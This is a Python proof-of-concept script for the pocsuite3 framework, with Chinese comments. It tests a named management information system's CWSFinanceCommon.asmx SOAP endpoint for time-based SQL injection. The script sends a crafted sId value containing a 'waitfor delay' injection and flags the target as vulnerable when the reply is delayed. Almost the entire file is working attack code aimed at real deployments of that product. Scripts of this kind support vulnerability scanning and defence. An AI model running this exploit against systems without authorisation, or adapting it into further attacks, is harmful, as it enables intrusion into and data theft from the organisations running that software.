# _*_ coding:utf-8 _*_
# @Time : 2023/11/21 20:19
# @Author: 为赋新词强说愁

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
import time

class XML_SQL(POCBase):
    pocDesc = ''' 捷诚管理信息系统 CWSFinanceCommon.asmx SQL注入漏洞'''
    vulID = '0'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-21'
    createDate = '2023-11-21'
    updateDate = '2023-11-21'
    name = '捷诚管理信息系统 CWSFinanceCommon.asmx SQL注入漏洞'
    appName = '捷诚管理信息系统'



    def _verify(self):

        result = {}
        path = "/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx" # 参数
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
            'Connection': 'close',
            'Content-Length': '369',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'Content-Type': 'text/xml; charset=utf-8',
            'Accept-Encoding': 'gzip',
        }

        payload = '''<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetOSpById xmlns="http://tempuri.org/">
              <sId>1';waitfor delay '0:0:5'--+</sId>
            </GetOSpById>
          </soap:Body>
        </soap:Envelope>'''

        url = self.url + path
        try:
            start_time = time.time()
            response = requests.post(url, headers=headers, data=payload,verify=False)
            end_time = time.time()
            res_time = end_time - start_time
        # 验证成功输出相关信息
            if response.status_code == 200 and res_time > 5 and res_time < 8:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(XML_SQL)